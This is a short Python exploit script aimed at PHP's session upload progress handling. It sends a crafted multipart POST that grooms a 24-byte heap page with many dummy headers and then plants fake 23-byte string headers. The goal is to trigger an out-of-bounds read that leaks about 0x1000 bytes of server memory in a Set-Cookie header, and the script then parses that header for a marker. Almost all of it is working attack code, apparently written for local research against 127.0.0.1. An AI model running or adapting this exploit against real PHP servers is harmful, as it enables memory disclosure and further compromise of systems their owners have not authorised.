#!/usr/bin/env python3
"""B (pure HTTP): hold the 24B page 0x6e with a dummy part's live 15-byte
header smart_strings, then free them and place fake 23-byte headers on the
same page.  Slot6 (chunk+0x6e090) gets len=0x1000 + MARK; END cleanup emits
a 0x1000-byte OOB Set-Cookie.
usage: b_24hold.py [MARK] [N]
"""
import socket,sys,struct
MARK=(sys.argv[1] if len(sys.argv)>1 else 'MARKMARK').encode()[:8].ljust(8,b'M')
N=int(sys.argv[2]) if len(sys.argv)>2 else 24
NY=int(sys.argv[3]) if len(sys.argv)>3 else 200
BND=b'B'*10
val23=struct.pack('<Q',0x1000)+MARK+b'F'*7
assert len(val23)==23
o=bytearray()
# part 1: dummy, unknown headers with 15-byte values -> live 24B smart_strings
h1=b'Content-Disposition: form-data; name="dummy"\r\n'
for i in range(NY):
    h1 += b'Y-%03d: '%i + b'y'*15 + b'\r\n'
o+=b'--'+BND+b'\r\n'+h1+b'\r\nx\r\n'
# part 2: progress, unknown headers with fake 23-byte values
h2=b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
for i in range(N):
    h2 += b'X-%02d: '%i + val23 + b'\r\n'
o+=b'--'+BND+b'\r\n'+h2+b'\r\npwn\r\n'
o+=b'--'+BND+b'--\r\n'
req=(f'POST /plain.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nCookie: PHPSESSID=attacksessionid0001\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<400000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
open('/tmp/b_24hold.resp','wb').write(data)
head,_,rest=data.partition(b'\r\n\r\n')
print('RESP_LEN',len(data))
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line))
        print('MARKPOS',line.find(MARK))
        print('VALUE',line[:180].decode('latin1','replace'))
print('BODY',rest[:80].decode('latin1','replace'))
